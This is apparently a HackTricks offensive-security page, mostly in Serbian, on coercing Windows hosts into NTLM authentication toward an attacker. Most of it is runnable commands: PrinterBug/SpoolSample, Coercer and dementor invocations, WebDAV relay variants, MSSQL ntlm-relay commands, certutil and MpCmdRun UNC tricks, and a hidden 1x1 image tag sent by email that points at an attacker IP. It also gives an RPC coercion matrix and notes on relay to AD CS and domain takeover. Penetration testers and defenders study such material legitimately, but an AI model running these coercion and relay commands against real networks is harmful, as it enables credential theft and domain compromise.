# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **kolekcija** **remote authentication triggera** napisana u C# koristeći MIDL compiler radi izbegavanja zavisnosti od trećih strana.

## Spooler Service Abuse

Ako je _**Print Spooler**_ service **omogućen,** možete koristiti neke već poznate AD credentials da **zatražite** od Domain Controller-ovog print servera **ažuriranje** o novim print jobs i samo mu kažete da **pošalje notification** nekom systemu.\
Imajte na umu da kada printer šalje notification proizvoljnom systemu, mora da se **autentifikuje prema** tom **systemu**. Zato napadač može naterati _**Print Spooler**_ service da se autentifikuje prema proizvoljnom systemu, a service će u toj autentifikaciji **koristiti computer account**.

Ispod haube, klasični **PrinterBug** primitive zloupotrebljava **`RpcRemoteFindFirstPrinterChangeNotificationEx`** preko **`\\PIPE\\spoolss`**. Napadač prvo otvara printer/server handle, a zatim prosleđuje lažno client name u `pszLocalMachine`, tako da target spooler kreira notification channel **nazad ka hostu pod kontrolom napadača**. Zato je efekat **outbound authentication coercion** umesto direktnog code execution.\
Ako tražite **RCE/LPE** u samom spooler-u, pogledajte [PrintNightmare](printnightmare.md). Ova stranica je fokusirana na **coercion i relay**.

### Finding Windows Servers on the domain

Koristeći PowerShell, dobijte listu Windows boxeva. Servers su obično prioritet, pa se fokusirajmo na njih:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Pronalaženje Spooler servisa koji slušaju

Koristeći malo izmenjeni @mysmartlogin-ov (Vincent Le Toux-ov) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler Service sluša:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Takođe možete da koristite `rpcdump.py` na Linux-u i potražite **MS-RPRN** protokol:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ili brzo testirajte hostove sa Linux-a pomoću **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Ako želite da **enumerate coercion surfaces** umesto da samo proveravate da li spooler endpoint postoji, koristite **Coercer scan mode**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Ovo je korisno zato što viđenje endpointa u EPM samo govori da je print RPC interface registrovan. To **ne** garantuje da je svaka coercion metoda dostupna sa tvojim trenutnim privilegijama niti da će host emitovati upotrebljiv authentication flow.

### Zatražite od service-a da se autentifikuje protiv proizvoljnog host-a

Možete kompajlirati [SpoolSample odavde](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ili koristi [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ili [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ako si na Linuxu
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Sa **Coercer**, možete direktno da targetirate spooler interfejse i izbegnete nagađanje koji RPC metod je izložen:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Prisiljavanje HTTP umesto SMB sa WebClient

Klasični PrinterBug obično dovodi do **SMB** autentikacije na `\\attacker\share`, što je i dalje korisno za **capture**, **relay to HTTP targets** ili **relay where SMB signing is absent**.\
Međutim, u modernim okruženjima, relaying **SMB to SMB** je često blokiran zbog **SMB signing**, pa operateri često preferiraju da prisile **HTTP/WebDAV** autentikaciju umesto toga.

Ako je na targetu pokrenut servis **WebClient**, listener može da se navede u obliku koji tera Windows da koristi **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Ovo je posebno korisno kada se kombinuje sa **`ntlmrelayx --adcs`** ili drugim HTTP relay metama, jer izbegava oslanjanje na SMB relayability na prinudno izazvanoj konekciji. Važna napomena je da **WebClient mora biti pokrenut** na žrtvi da bi HTTP/WebDAV varijanta radila.

### Combining with Unconstrained Delegation

Ako je napadač već kompromitovao računar sa [Unconstrained Delegation](unconstrained-delegation.md), napadač bi mogao **naterati printer da se autentifikuje protiv ovog računara**. Zbog unconstrained delegation, **TGT** od **computer account of the printer** biće **sačuvan u** **memoriji** računara sa unconstrained delegation. Pošto je napadač već kompromitovao ovaj host, moći će da **preuzme ovaj ticket** i zloupotrebi ga ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Napomena: Ove metode prihvataju parametre koji mogu da nose UNC path (npr. `\\attacker\share`). Kada se obrade, Windows će se autentifikovati (machine/user context) na taj UNC, omogućavajući NetNTLM capture ili relay.\
Za spooler abuse, **MS-RPRN opnum 65** i dalje ostaje najčešći i najbolje dokumentovan primitive jer specifikacija protokola izričito navodi da server kreira notification kanal nazad ka klijentu navedenom u `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: target pokušava da otvori navedenu backup putanju loga i autentifikuje se na UNC pod kontrolom napadača.
- Practical use: naterati Tier 0 assete (DC/RODC/Citrix/etc.) da emituju NetNTLM, a zatim relayu do AD CS endpointa (ESC8/ESC11 scenarios) ili drugih privilegovanih servisa.

## PrivExchange

`PrivExchange` attack je rezultat propusta pronađenog u **Exchange Server `PushSubscription` feature**. Ovaj feature omogućava da Exchange server bilo koji domain user sa mailboxom može biti primoran da se autentifikuje prema bilo kom hostu koji obezbedi klijent preko HTTP.

Podrazumevano, **Exchange service radi kao SYSTEM** i dodeljene su mu preterane privilegije (konkretno, ima **WriteDacl privileges na domain pre-2019 Cumulative Update**). Ovaj propust može da se iskoristi da bi se omogućio **relaying of information to LDAP and subsequently extract the domain NTDS database**. U slučajevima kada relaying to LDAP nije moguć, ovaj propust se i dalje može koristiti za relay i autentifikaciju ka drugim hostovima unutar domain-a. Uspešna eksploatacija ovog napada daje trenutni pristup Domain Admin-u sa bilo kojim authenticated domain user account-om.

## Inside Windows

Ako ste već unutar Windows mašine, možete naterati Windows da se poveže na server koristeći privilegovane naloge sa:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ili upotrebite ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Moguće je koristiti certutil.exe lolbin (Microsoft-signed binary) za izazivanje NTLM autentikacije:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injekcija

### Putem emaila

Ako znaš **email adresu** korisnika koji se prijavljuje na mašinu koju želiš da kompromituješ, možeš mu jednostavno poslati **email sa 1x1 slikom** kao što je
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
i kada ga otvori, pokušaće da se autentifikuje.

### MitM

Ako možeš da izvedeš MitM napad na računar i ubaciš HTML u stranicu koju će on pregledati, mogao bi da pokušaš da ubaciš sliku poput sledeće u stranicu:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Drugi načini za prinudno pokretanje i phishing NTLM autentikacije


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Ako možeš da uhvatiš [NTLMv1 challenges ovde pročitaj kako da ih crackuješ](../ntlm/index.html#ntlmv1-attack).\
_Zapamti da, da bi crackovao NTLMv1, treba da postaviš Responder challenge na "1122334455667788"_

## Reference
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
